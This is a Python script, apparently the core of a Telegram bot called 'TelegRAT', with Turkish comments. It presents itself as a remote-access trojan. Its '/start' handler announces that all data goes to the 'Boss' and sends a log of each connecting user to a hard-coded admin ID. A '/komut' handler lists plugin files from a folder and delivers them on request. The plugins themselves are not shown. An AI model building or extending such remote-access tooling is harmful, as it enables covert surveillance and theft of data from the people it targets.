#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @mhmmtlmst tarafından yazılmıştır.

from pyrogram import Client, Filters
from os import listdir

TelegRAT = Client(
    api_id=XXXXXX,                                  # my.telegram.org/apps
    api_hash="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",    # my.telegram.org/apps
    session_name = "@XXXXXXXX",                     # Salla Gitsin
    bot_token = "XXXXXXX:XXXXXXXXXX",               # @BotFather
    plugins=dict(root="Eklentiler")
)

adminID = 1174032662                                # Kendi Kullanıcı id'niz

@TelegRAT.on_message(Filters.command(['start'], ['!','.','/']))
def start(client, message):
    # Hoş Geldin Mesajı
    message.reply_chat_action("typing")
    message.reply(f"☣ **TelegRAT** ☣\n\nBütün veriler [Patron](tg://user?id={adminID})'a Gönderilecek!")

    # LOG Alanı
    log = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | Bota Bağlantı Sağladı"
    client.send_message(adminID, log)

@TelegRAT.on_message(Filters.command(['komut'], ['!','.','/']))
def eklentiGonder(client, message):
    mesaj = client.send_message(adminID,"Bekleyin..")
    girilenYazi = message.text

    if len(girilenYazi.split()) == 1:
        eklentiler = "Eklentilerim ;\n\n"
        for dosya in listdir("./Eklentiler/"):
            if not dosya.endswith(".py"): continue
            eklentiler += f"📂 `{dosya.replace('.py', '')}`\n"
        mesaj.edit(eklentiler)
        return

    dosya = " ".join(girilenYazi.split()[1:2])

    if f"{dosya}.py" in listdir("Eklentiler"):
        mesaj.delete()
        message.reply_document(f"./Eklentiler/{dosya}.py")
    else : mesaj.edit('Dosya Bulunamadı!')

if __name__ == '__main__':
    TelegRAT.run()
